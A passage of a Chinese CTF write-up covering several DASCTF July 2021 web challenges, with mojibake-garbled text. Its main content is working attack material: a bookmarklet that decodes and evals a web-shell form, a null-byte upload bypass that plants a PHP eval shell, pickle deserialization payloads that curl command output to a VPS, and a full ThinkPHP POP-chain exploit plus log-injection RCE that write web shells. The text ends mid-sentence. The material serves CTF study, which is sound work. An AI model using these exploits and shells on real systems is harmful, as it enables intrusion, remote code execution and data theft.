javascript:{window.localStorage.embed=window.atob(\"ZG9jdW1lbnQud3JpdGUoIjxwPiIpOw0KdmFyIGh0bWwgPSAiPGZvcm0gbWV0aG9kPXBvc3QgYWN0aW9uPSdjbWQuanNwJz5cDQo8aW5wdXQgbmFtZT0nYycgdHlwZT10ZXh0PjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0nUnVuJz5cDQo8L2Zvcm0+PGhyPlwNCjxmb3JtIGFjdGlvbj0nY21kLmpzcCcgbWV0aG9kPXBvc3Q+XA0KVXBsb2FkIGRpcjogPGlucHV0IG5hbWU9J2EnIHR5cGU9dGV4dCB2YWx1ZT0nLic+PGJyPlwNClNlbGVjdCBhIGZpbGUgdG8gdXBsb2FkOiA8aW5wdXQgbmFtZT0nbicgdHlwZT0nZmlsZScgaWQ9J2YnPlwNCjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2InIGlkPSdiJz5cDQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBsb2FkJz5cDQo8L2Zvcm0+PGhyPiI7DQp2YXIgZGl2ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQpkaXYuaW5uZXJIVE1MID0gaHRtbDsNCmRvY3VtZW50LmJvZHkuaW5zZXJ0QmVmb3JlKGRpdiwgZG9jdW1lbnQuYm9keS5maXJzdENoaWxkKTsNCg0KdmFyIGhhbmRsZUZpbGVTZWxlY3QgPSBmdW5jdGlvbihldnQpIHsNCiAgICB2YXIgZmlsZXMgPSBldnQudGFyZ2V0LmZpbGVzOw0KICAgIHZhciBmaWxlID0gZmlsZXNbMF07DQoNCiAgICBpZiAoZmlsZXMgJiYgZmlsZSkgew0KICAgICAgICB2YXIgcmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCg0KICAgICAgICByZWFkZXIub25sb2FkID0gZnVuY3Rpb24ocmVhZGVyRXZ0KSB7DQogICAgICAgICAgICB2YXIgYmluYXJ5U3RyaW5nID0gcmVhZGVyRXZ0LnRhcmdldC5yZXN1bHQ7DQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYicpLnZhbHVlID0gYnRvYShiaW5hcnlTdHJpbmcpOw0KICAgICAgICB9Ow0KDQogICAgICAgIHJlYWRlci5yZWFkQXNCaW5hcnlTdHJpbmcoZmlsZSk7DQogICAgfQ0KfTsNCmlmICh3aW5kb3cuRmlsZSAmJiB3aW5kb3cuRmlsZVJlYWRlciAmJiB3aW5kb3cuRmlsZUxpc3QgJiYgd2luZG93LkJsb2IpIHsNCiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGhhbmRsZUZpbGVTZWxlY3QsIGZhbHNlKTsNCn0gZWxzZSB7DQogICAgYWxlcnQoJ1RoZSBGaWxlIEFQSXMgYXJlIG5vdCBmdWxseSBzdXBwb3J0ZWQgaW4gdGhpcyBicm93c2VyLicpOw0KfQ==\");eval(window.localStorage.embed);};void(0); ä¸è¿‡è¿™ä¸ª shell ä¼°è®¡æ˜¯ä¸ªç®€å•çš„å°é©¬ï¼Œä¸å¸¦åŠ å¯†çš„ï¼Œæ–‡ä»¶åæ˜¯ cmd.jspï¼Œæ‰§è¡Œå‘½ä»¤çš„å¯†ç  cã€‚éœ€è¦çš„è¯å¯ä»¥è‡ªå·±æ”¹ä¸€ä¸‹ã€‚ jjâ€™s camera jjåœ¨æŸæ¬¡ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¸­å‘ç°äº†ä¸ªé»‘å®¢åšçš„ç½‘ç«™ï¼Œè¯·ä½¿ç”¨httpsè®¿é—®ç«™ç‚¹ Hint: ç½‘ä¸Šèƒ½æœåˆ°æºç ï¼Œä»…ä¿®æ”¹äº†å‰ç«¯uiï¼Œæ³¨æ„æœåŠ¡å™¨çš„å“åº” æ˜¯ä¸ªä¼šè‡ªåŠ¨æŠ“æ‹ç„¶åä¸Šä¼ åç«¯å¹¶ 302 è·³è½¬åˆ°ä»»æ„ url çš„ç½‘ç«™ã€‚ æ ¹æ® /sc.php?id=miao&amp;url=http://baidu.com ä»¥åŠé¡µé¢ä¸Šçš„ä»£ç  &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;ç­‰å¾…è·³è½¬...&lt;/title&gt; &lt;meta name=\"author\" content=\"DeathGhost\"/&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"style/css/style.css\"/&gt; &lt;style&gt; body { height: 100%; background: #16a085; overflow: hidden; } canvas { z-index: -1; position: absolute; } &lt;/style&gt; &lt;script src=\"style/js/jquery.js\"&gt;&lt;/script&gt; &lt;!-- &lt;script src=\"style/js/verificationNumbers.js\"&gt;&lt;/script&gt; --&gt; &lt;script src=\"style/js/Particleground.js\"&gt;&lt;/script&gt; &lt;script&gt; $(document).ready(function () { //ç²’å­èƒŒæ™¯ç‰¹æ•ˆ $('body').particleground({ dotColor: '#5cbdaa', lineColor: '#5cbdaa' }); }); &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;video id=\"video\" width=\"0\" height=\"0\" autoplay&gt;&lt;/video&gt; &lt;canvas style=\"width:0px;height:0px\" id=\"canvas\" width=\"480\" height=\"640\"&gt;&lt;/canvas&gt; &lt;script type=\"text/javascript\"&gt; window.addEventListener(\"DOMContentLoaded\", function () { var canvas = document.getElementById('canvas'); var context = canvas.getContext('2d'); var video = document.getElementById('video'); if (navigator.mediaDevices &amp;&amp; navigator.mediaDevices.getUserMedia) { navigator.mediaDevices.getUserMedia({video: true}).then(function (stream) { video.srcObject = stream; video.play(); setTimeout(function () { context.drawImage(video, 0, 0, 480, 640); }, 1000); setTimeout(function () { var img = canvas.toDataURL('image/png'); document.getElementById('result').value = img; document.getElementById('gopo').submit(); }, 1300); }, function () { alert(\"hacked by jj\"); }); } }, false); &lt;/script&gt; &lt;form action=\"qbl.php?id=miao&amp;url=http://baidu.com\" id=\"gopo\" method=\"post\"&gt; &lt;input type=\"hidden\" name=\"img\" id=\"result\" value=\"\"/&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; ç›´æ¥ä¸Š GitHub ä¸Šä¸€æœ qbl.php https://github.com/FlyRenxing/php-utility-api-collection/tree/master/H5Snap https://github.com/xiaoma55/hexo_blog/tree/master/source/customerPage/youqu/zhaoYaoJing https://github.com/SStarbuckS/autopohot https://github.com/shiguangrenranrs/Photo ï¼ˆæœ‰ç‚¹åŒºåˆ«è¿™ä¸ªï¼‰ åº”è¯¥éƒ½å·®ä¸å¤šã€‚ å…³é”®ä»£ç åœ¨ qbl.php &lt;?php error_reporting(0); $base64_img = trim($_POST['img']); $id = trim($_GET['id']); $url = trim($_GET['url']); $up_dir = './img/';//å­˜æ”¾åœ¨å½“å‰ç›®å½•çš„imgæ–‡ä»¶å¤¹ä¸‹ if(empty($id) || empty($url) || empty($base64_img)){ exit; } if(!file_exists($up_dir)){ mkdir($up_dir,0777); } if(preg_match('/^(data:\\s*image\\/(\\w+);base64,)/', $base64_img, $result)){ $type = $result[2]; if(in_array($type,array('bmp','png'))){ $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type; file_put_contents($new_file, base64_decode(str_replace($result[1], '', $base64_img))); header(\"Location: \".$url); } } ?&gt; è¿™é‡Œçš„ $type æ˜¯ä» post å‚æ•°é‡Œçš„ image/(\\w+) æ¥çš„ï¼Œä½†æ˜¯é™åˆ¶äº†åªèƒ½æ˜¯ bmp æˆ–è€… pngï¼Œç»•ä¸è¿‡ä¹Ÿä¸å¯æ§ã€‚ å†çœ‹ $new_file = $up_dir.$id.'_'.date('mdHis_').'.'.$type; è¿™å¥ï¼Œè¿™ä¸ª $id ä» GET å‚æ•°æ¥çš„ï¼Œæ˜¯å¯æ§çš„ã€‚ ä½†æ˜¯ä¸ºäº†ä¸Šä¼ ä½¿å¾—åç¼€åä¸º .phpï¼Œé‚£å°±éœ€è¦ æ­é… %00 æˆªæ–­ã€‚ è¯•äº†è€åŠå¤©å‘ç°è¿˜ä¸è¡Œæœ€åå‘ç°æ¼çœ‹äº†ä¸ª trimï¼ˆåˆ«éª‚äº†åˆ«éª‚äº† ç”±äºè¿™ä¸ª trim å‡½æ•°ä¼šæŠŠå­—ç¬¦ä¸²é¦–å°¾çš„ç©ºå­—ç¬¦ç»™å»é™¤ï¼Œäºæ˜¯å°±å¾—åŠ ä¸ªå…¶ä»–çš„å­—ç¬¦åŒ…è£¹ä¸€ä¸‹ %00. æ„é€  id ä¸º miao.php%00.ï¼Œä¸Šä¼ çš„æ–‡ä»¶å†…å®¹æ˜¯ base64 encode + urlencode åçš„ä¸€å¥è¯æœ¨é©¬ã€‚ &lt;?php @eval($_REQUEST['m']);?&gt; payload: POST /qbl.php?id=miao.php%00.&amp;url=http://baidu.com HTTP/1.1 Host: node4.buuoj.cn:28820 Content-Length: 72 Pragma: no-cache Cache-Control: no-cache Sec-Ch-Ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\" Sec-Ch-Ua-Mobile: ?0 Upgrade-Insecure-Requests: 1 Origin: https://node4.buuoj.cn:28820 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-Dest: document Referer: https://node4.buuoj.cn:28820/sc.php?id=miao&amp;url=http://baidu.com Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close img=data%3aimage/png%3bbase64,PD9waHAgQGV2YWwoJF9SRVFVRVNUWydtJ10pOz8%2b Extensive reading: æŒ–æ´å§¿åŠ¿ | æ·±åº¦èŠèŠPHPä¸‹çš„â€œæˆªæ–­â€é—®é¢˜ è¿‡æ°”çš„00æˆªæ–­ %00 æˆªæ–­çš„åˆ©ç”¨æ¡ä»¶ï¼š phpç‰ˆæœ¬å°äº5.3.4 phpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ cybercms èµ›åšCMSï¼Œåªä¸ºå®‰å…¨è€Œç”Ÿ Hint: ä¿¡æ¯æœé›†æ˜¯ä¸€ä¸ªwebæ‰‹å¿…å¤‡çš„æŠ€èƒ½ è¯¦è§å¦ä¸€ç¯‡åšå®¢ï¼š CTF | 2021 DASCTF July cybercms ä¸€æ¢å†æ¢ easywebé¢˜ç›®ç»™äº† dockerfile åŠåç«¯æºç ã€‚ app.py from hypercorn.middleware import DispatcherMiddleware from vuln_app import vuln_app from simple_app import simple_app dispatcher_app = DispatcherMiddleware({ \"/vuln\": vuln_app, \"/\": simple_app, }) if __name__ == '__main__': a = 1 simple_app.py from a2wsgi import WSGIMiddleware def application(env, start_response): start_response('200 OK', [('Content-Type','text/html')]) return [b\"Hello World\"] simple_app = WSGIMiddleware(application) vuln_app.py from wsgiref.simple_server import make_server from pyramid.config import Configurator from pyramid.response import Response from pyramid.renderers import render_to_response from pyramid.session import SignedCookieSessionFactory, PickleSerializer from webob.cookies import Base64Serializer from a2wsgi import WSGIMiddleware my_session_factory = SignedCookieSessionFactory(\"233333333333\", serializer=Base64Serializer(PickleSerializer())) def hello_world(request): request.session[\"233\"] = \"2333\" return Response('Hello World!') vuln_app = None with Configurator() as config: config.set_session_factory(my_session_factory) config.add_route('hello', '/') config.add_view(hello_world, route_name='hello') vuln_app = WSGIMiddleware(config.make_wsgi_app()) if __name__ == '__main__': with Configurator() as config: config.set_session_factory(my_session_factory) config.add_route('hello', '/') config.add_view(hello_world, route_name='hello') app = config.make_wsgi_app() server = make_server('0.0.0.0', 6543, app) server.serve_forever() dockerfile FROM ubuntu:18.04 ENV DEBIAN_FRONTEND=noninteractive RUN sed -i \"s/archive.ubuntu.com/mirrors.aliyun.com/g\" /etc/apt/sources.list &amp;&amp; apt update &amp;&amp; apt dist-upgrade -y RUN apt install -y software-properties-common &amp;&amp; add-apt-repository ppa:deadsnakes/ppa &amp;&amp; apt install python3.8 -y RUN apt install nginx python3-pip curl -y ADD nginx.conf /etc/nginx/sites-available/default COPY conf/* /root/ WORKDIR /root ADD flag /flag RUN chmod 600 /flag ADD readflag.c /readflag.c RUN apt -y install gcc &amp;&amp; \\ gcc /readflag.c -o /readflag &amp;&amp; \\ chmod +s /readflag COPY app /app WORKDIR /app RUN mv /usr/bin/python3.8 /usr/bin/python3 &amp;&amp; python3 -m pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple # CMD python3 -m http.server CMD nginx &amp;&amp; useradd ctf &amp;&amp; su ctf -c 'hypercorn --bind 0.0.0.0:4488 app:dispatcher_app' &amp;&amp; tail -f /dev/null flag è¦é€šè¿‡æ‰§è¡Œ /readflag æ¥è·å¾—ã€‚ app.py é‡Œæ³¨å†Œäº†ä¸¤ä¸ªè·¯ç”±ï¼Œæ ¹ç›®å½•è®¿é—®çš„æ˜¯ simple_appï¼Œçœ‹ä¸Šå»æ²¡å•¥é—®é¢˜ï¼Œä¸»è¦è¿˜æ˜¯ /vuln ä¸‹è®¿é—®çš„ vuln_appï¼Œå…¶ä¸­ç”¨åˆ°äº† PickleSerializerï¼Œç›²çŒœå°±æœ‰ pickle åºåˆ—åŒ–åœ¨é‡Œé¢äº†ã€‚ ç›´æ¥æ‰“ä¸Šæ–­ç‚¹ï¼Œè·Ÿä¸€æ³¢ debugï¼ŒæˆåŠŸå‘ç°äº† pickle.loadsã€‚åœ¨è®¾ç½® session æ—¶å…ˆä»è¯·æ±‚è·å– sessionï¼Œè€Œåå†è®¾ç½®æ–°çš„ sessionã€‚ ä» cookie é‡Œå–å‡º sessionï¼Œè¿›è¡Œ urlsafe_b64decodeï¼Œå†æˆªå–å‡º cstruct å’Œç­¾å expected_sigï¼Œè¿›è¡Œæ ¡éªŒåå¯¹ cstruct å†ä¸€æ¬¡ urlsafe_b64decodeï¼Œæœ€åè°ƒç”¨ pickle.loadsã€‚ è®¾ç½® cookie çš„æ“ä½œåœ¨ Response æ—¶è¿›è¡Œï¼Œæœ€ç»ˆä¼šè°ƒç”¨ä¸Šå›¾çš„ pickle.dumpsã€‚ åšé¢˜çš„è¯ï¼Œå¯ä»¥ç›´æ¥æ”¹æœ€åè¿™ä¸ª pickle.dumps ç»“æœä¸ºæ„é€ å¥½çš„ pickle payloadã€‚ å¯ä»¥å‚è€ƒ 2021 å·…å³°æå®¢ç½‘ç»œå®‰å…¨æŠ€èƒ½æŒ‘æˆ˜èµ› opcode ä¸€é¢˜ï¼Œæ¯”å¦‚ b\"(cos\\nsystem\\nS\\'curl http://VPS:PORT/?flag=`/readflag`\\'\\no.\" # or b'cposix\\nsystem\\nX3\\x00\\x00\\x00curl http://VPS:PORT/`readflag | base64`\\x85R.' ç„¶åæœ¬åœ°èµ·æœåŠ¡ï¼Œæµè§ˆå™¨é‡Œè¯·æ±‚ä¸€ä¸‹ï¼ŒæŠŠ cookie å¤åˆ¶ä¸€ä¸‹ï¼ŒæŠŠè¿™ä¸ªä½œä¸º payload èµ‹å€¼ç»™è¿œç¨‹çš„ cookie å°±å®Œäº‹äº†ã€‚ è®¿é—® http://xxxxxxxxx/vulnï¼Œä¿®æ”¹ cookieï¼Œåˆ·æ–°é¡µé¢ï¼Œvps ä¸Šèµ·ä¸ª web æœåŠ¡ç›‘å¬ï¼Œæ‹¿åˆ° flag å®Œäº‹ã€‚ æˆ–è€…å‚è€ƒå¤§å¸ˆå‚…æ›´æ–¹ä¾¿çš„æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥æ”¹åç«¯ä»£ç ï¼Œç›´æ¥è®¾ç½®ä¸ªæ–°çš„ session å®ä¾‹åŒ–ä¸€ä¸ª RCE å¯¹è±¡ã€‚ class Miao(object): def __reduce__(self): import os return os.system, (\"curl http://VPS/?flag=`/readflag`\",) def hello_world(request): request.session[\"233\"] = \"2333\" request.session[\"miao\"] = Miao() print(request.session) return Response('Hello World!') æœ¬åœ°è°ƒè¯•å¯ä»¥å‘ç°ç¬¬ä¸€æ¬¡è®¿é—®ä¼šè®¾ç½®ä¸Š sessionï¼Œç¬¬äºŒæ¬¡è®¿é—®çš„æ—¶å€™å°±ä¼šååºåˆ—åŒ– pickle æ‰§è¡Œ payload äº†ã€‚ æœ¬åœ°èµ·ä¸ªåŸå§‹çš„ appï¼Œæ”¹å¥½ cookieï¼Œåˆ·æ–°é¡µé¢å°±èƒ½æ‰“é€šäº†ã€‚ å—¯å¾ˆå¥½ï¼Œè¿œç¨‹æ²¡æ‰“é€šï¼ é‡è¯•äº†å‡ æ¬¡ï¼Œè¿˜æ˜¯æ²¡æˆåŠŸâ€¦â€¦ æœ€åå¯»æ€ç€æ˜¯ä¸æ˜¯é‚£ä¸ª pickle åºåˆ—åŒ–æ—¶å€™å’Œæ“ä½œç³»ç»Ÿæœ‰å…³å•Šï¼Ÿ æ¢åˆ° kali ä¸‹èµ· web æœåŠ¡ï¼Œç”Ÿæˆ payload å†æ‰”åˆ°è¿œç¨‹å»ï¼Œè¿™å›æˆåŠŸäº†â€¦â€¦ ez_website ç®€å•çš„é¢˜ç›® https://dasctf-july-1251267611.file.myqcloud.com/ez_website.zip ç»™äº†æºç ï¼Œé½åšX1.0ï¼ŒåŸºäºThinkPHP V5.0.18 äºŒæ¬¡å¼€å‘çš„ã€‚ http://xxxxxxxxx/admin.php/admin/index/index.html åå°å¼±å¯†ç  admin/admin888 ä¸è¿‡åå°ä¸Šä¼ è²Œä¼¼ä¸è¡Œï¼Œsql æ‰§è¡Œå¼€å¯äº† --secure-file-privï¼Œä¸èƒ½å†™å…¥æ–‡ä»¶ã€‚ æ‰“æ³•1 å‰å°ååºåˆ—åŒ– RCEè¿™é‡Œå¤ç°ï¼Œä¸»è¦å‚è€ƒ é½åšå»ºç«™ç³»ç»Ÿx1.0ä»£ç å®¡è®¡ æœ‰ä¸€å¤„å‰å°ååºåˆ—åŒ–çš„åœ°æ–¹ application\\index\\controller\\Labelmodels.php ç›´æ¥æ‹¿æ–‡ç« é‡Œé¢çš„ç°æˆ exp æ¥æ‰“äº†ã€‚ &lt;?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-&gt;files = [$files]; //$file =&gt; /think/Modelçš„å­ç±»new Pivot(); Modelæ˜¯æŠ½è±¡ç±» } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-&gt;parent = $output; //$this-&gt;parent=&gt; think\\console\\Output; $this-&gt;append = array(\"xxx\"=&gt;\"getError\"); //è°ƒç”¨getError è¿”å›this-&gt;error $this-&gt;error = $modelRelation; // $this-&gt;error è¦ä¸º relationç±»çš„å­ç±»ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯OnetoOneç±»çš„å­ç±»==&gt;&gt;HasOne } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$queryæŒ‡å‘Query $this-&gt;bindAttr = ['xxx'];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-&gt;styles = ['getAttr']; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-&gt;options=[ 'expire' =&gt; 3600, 'cache_subdir' =&gt; false, 'prefix' =&gt; '', 'path' =&gt; 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php', 'data_compress' =&gt; false, ]; $this-&gt;tag = 'xxx'; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo urlencode(serialize($window)); } http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A122%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D çœ‹èµ·æ¥å·²ç»èµ°è¿‡ååºåˆ—åŒ–è¿™æ¡è¯­å¥äº†ï¼Œæ‰§è¡ŒæˆåŠŸäº†ã€‚ æœ¨é©¬çš„æ–‡ä»¶åæ˜¯ a.php åŠ ä¸Š var_dump(md5('tag_'.md5('xxx'))); çš„ç»“æœï¼Œä¹Ÿå°±æ˜¯ a.php12ac95f1498ce51d2d96a249c09c1998.php ç„¶è€Œç›´æ¥è®¿é—®æ ¹ç›®å½•ä¸‹çš„è¿™ä¸ªæ–‡ä»¶ 404 äº†â€¦â€¦ åæ¥å‘ç°æ˜¯æ ¹ç›®å½•ä¸‹ www-data ç”¨æˆ·æ²¡æœ‰å†™å…¥æƒé™ï¼Œå­ç›®å½•ä¸‹æ‰æœ‰ã€‚ ï¼ˆå…¶å®æ˜¯åœ¨æ‰“æ³•2æ‰å‘ç°çš„ 2333 æ”¹ä¸€æ”¹ payloadï¼Œå†™å…¥åˆ° runtime ç›®å½•ä¸‹ã€‚è®°å¾—æ”¹é•¿åº¦ã€‚ http://xxxxxxx/index.php/index/labelmodels/get_label?tag_array[cfg]=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00append%22%3Ba%3A1%3A%7Bs%3A3%3A%22xxx%22%3Bs%3A8%3A%22getError%22%3B%7Ds%3A8%3A%22%00%2A%00error%22%3BO%3A27%3A%22think%5Cmodel%5Crelation%5CHasOne%22%3A3%3A%7Bs%3A15%3A%22%00%2A%00selfRelation%22%3Bi%3A0%3Bs%3A11%3A%22%00%2A%00bindAttr%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A3%3A%22xxx%22%3B%7Ds%3A8%3A%22%00%2A%00query%22%3BO%3A14%3A%22think%5Cdb%5CQuery%22%3A1%3A%7Bs%3A8%3A%22%00%2A%00model%22%3BO%3A20%3A%22think%5Cconsole%5COutput%22%3A2%3A%7Bs%3A28%3A%22%00think%5Cconsole%5COutput%00handle%22%3BO%3A30%3A%22think%5Csession%5Cdriver%5CMemcached%22%3A1%3A%7Bs%3A10%3A%22%00%2A%00handler%22%3BO%3A23%3A%22think%5Ccache%5Cdriver%5CFile%22%3A2%3A%7Bs%3A10%3A%22%00%2A%00options%22%3Ba%3A5%3A%7Bs%3A6%3A%22expire%22%3Bi%3A3600%3Bs%3A12%3A%22cache_subdir%22%3Bb%3A0%3Bs%3A6%3A%22prefix%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22path%22%3Bs%3A130%3A%22php%3A%2F%2Ffilter%2Fconvert.iconv.utf-8.utf-7%7Cconvert.base64-decode%2Fresource%3DaaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g%2F..%2Fruntime%2Fa.php%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3B%7Ds%3A6%3A%22%00%2A%00tag%22%3Bs%3A3%3A%22xxx%22%3B%7D%7Ds%3A9%3A%22%00%2A%00styles%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22getAttr%22%3B%7D%7D%7D%7Ds%3A6%3A%22parent%22%3Br%3A11%3B%7D%7D%7D ç”Ÿæˆçš„æœ¨é©¬åœ¨ /runtime/a.php12ac95f1498ce51d2d96a249c09c1998.phpï¼Œå¯†ç  ccc æ‰“æ³•2 å‡çº§æ—¥å¿— RCEå‚è€ƒ Y4tacker å¸ˆå‚…çš„ [ä»£ç å®¡è®¡]é½åšå»ºç«™ç³»ç»Ÿx1.0ä¼ä¸šç‰ˆä»£ç å®¡è®¡ ï¼ˆOrz application/admin/controller/Upgrade.phpä¸‹çš„ sysup å‡½æ•°åœ¨å†™å…¥å‡çº§æ—¥å¿—æ—¶ç›´æ¥æ‹¼æ¥äº† GET å‚æ•°ä¸­çš„ upgrade_editionï¼Œä¸”å†™å…¥çš„æ–‡ä»¶åç¼€ä¸º .php æ„é€  payload \",\"\"=&gt;eval($_POST[%27miao%27])-\"// åŸæ–‡ä¸­çš„æ˜¯ \",\"\"=&gt;-eval($_POST[%27yyds%27])-\",];?&gt;// http://xxxxx/admin.php/admin/upgrade/sysup.html?upgrade_edition=%22,%22%22=%3Eeval($_POST[%27miao%27])-%22// åœ¨ http://xxx/runtime/client_upgrade_edition.php ç”Ÿæˆäº†ä¸€å¥è¯æœ¨é©¬ã€‚ æ‹¼æ¥åçš„æ–‡ä»¶å†…å®¹ä¸º &lt;?php return [\"md5\"=&gt;\"\",\"\"=&gt;eval($_POST['miao'])-\"//\",\"time\"=&gt;\"2021-08-03 17:31\",]; å…¶å®å¯»æ€ç€ payload æ”¹æˆä¸‹é¢è¿™ä¸ªæ›´å¥½ï¼Œæ‹¼æ¥å­—ç¬¦ä¸²ä¸ä¼šæŠ¥ warning 23333. \",\"\"=&gt;eval($_POST[%27miao%27]).\"// å®‰å…¨,å®‰å…¨,è¿˜æ˜¯xxxçš„å®‰å…¨ æŸä¸ªç‰¹åˆ«å®‰å…¨çš„å•†åº— Hint: CREATE TABLE \"users\" ( \"id\" INTEGER NOT NULL, \"username\" TEXT UNIQUE , \"login_password\" text, \"money\" INTEGER, \"pay_password\" TEXT, \"flag_num\" INTEGER, PRIMARY KEY (\"id\") ); CREATE TABLE \"flaaaaaaaaag\" ( \"flllllllag\" TEXT ); æ˜¯ä¸ªé›¶è§£é¢˜ã€‚ æ ¹æ®ç»™çš„ hint å¯ä»¥çŸ¥é“æ˜¯è¦ SQL æ³¨å…¥ã€‚ æœ¬æ¥ä»¥ä¸ºæ³¨å…¥ç‚¹åœ¨ è´­ä¹° è¿™é‡Œçš„ flag æ•°é‡ä¸Šï¼Œç„¶è€Œå¹¶æ²¡æœ‰æ‰¾åˆ°å›æ˜¾ç‚¹ï¼Œè€Œä¸”è¿”å›é”™è¯¯ Hacker äº†ã€‚ å‚è€ƒ erR0Ratao å¸ˆå‚…çš„ wpï¼Œæ³¨å…¥ç‚¹åœ¨æ³¨å†ŒåŠŸèƒ½çš„ pay_password å¤„ã€‚ var app = new Vue({ el: '#app', data() { return { users: { username: '', password: '', pay_password: '' }, rules: { username: [ {required: true, message: 'è¯·è¾“å…¥ç”¨æˆ·å', trigger: 'blur'}, {min: 3, max: 32, message: 'é•¿åº¦åœ¨ 3 åˆ° 32 ä¸ªå­—ç¬¦', trigger: 'blur'} ], password: [{required: true, message: 